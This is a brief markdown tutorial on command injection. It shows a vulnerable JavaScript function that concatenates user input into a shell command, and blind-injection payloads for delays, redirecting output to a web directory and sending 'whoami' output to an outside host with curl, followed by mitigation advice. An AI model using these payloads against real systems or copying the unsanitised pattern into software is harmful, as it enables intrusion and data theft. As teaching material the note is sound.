# 💉 Command Injection

Command Injection is a vulnerability that occurs when a user manages to execute commands in an application by manipulating parameters.

## 👨🏻‍🦯 Blind Command Injection

This occurs when the result of the command is not returned to the user. In this case, we can use some tactics to obtain this result.

**Example**:

```javascript
function sleep(time) {
    return os.execute("sleep" + time)
}
```

### Delays
```shell
sleep 10 & ping -c 50 localhost
```

### Outbound redirection
```shell
sleep 10 & whoami > / www /default/output.txt
```

### Interaction with external service
```shell
sleep 10 & curl https://foosite.com/$(whoami)
```

## 🛡️ Mitigation
```http
Do not execute commands on the system that receive user input.
```

- Validate that the user's input is as expected (only numbers, only letters and numbers, etc).

- Limit as much as possible the local permissions of the user who is used to execute the commands.

- Limit the machine used to execute commands as much as possible (block outgoing network traffic, limit traffic on the local network, etc).